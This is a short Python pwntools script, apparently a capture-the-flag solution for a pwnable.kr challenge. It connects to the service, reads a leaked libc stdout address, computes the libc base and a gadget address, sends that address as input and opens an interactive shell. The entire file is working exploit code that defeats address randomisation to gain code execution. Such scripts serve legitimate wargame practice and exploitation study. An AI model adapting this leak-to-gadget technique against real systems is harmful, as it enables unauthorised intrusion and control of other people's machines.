from pwn import *


class ExploitableExploit(object):
    LIBC_STDOUT_OFFSET = 0x1b3d60
    INTERESTING_GADGET_LIBC_OFFSET = 0x3ac6c

    def __init__(self):
        self.shell = remote("pwnable.kr", 9018)

    def run(self):
        stdout_address = u32(self.shell.recv(4))
        libc_base_address = stdout_address - self.LIBC_STDOUT_OFFSET
        gadget_address = libc_base_address + self.INTERESTING_GADGET_LIBC_OFFSET
        gadget_input = str(u32(p32(gadget_address), sign="signed"))
        print("STDOUT ADDRESS", hex(stdout_address))
        print("LIBC BASE ADDRESS", hex(libc_base_address))
        print("GADGET ADDRESS", hex(gadget_address))
        print("GADGET INPUT", gadget_input)
        self.shell.sendline(gadget_input)
        self.shell.interactive()


if __name__ == '__main__':
    ExploitableExploit().run()
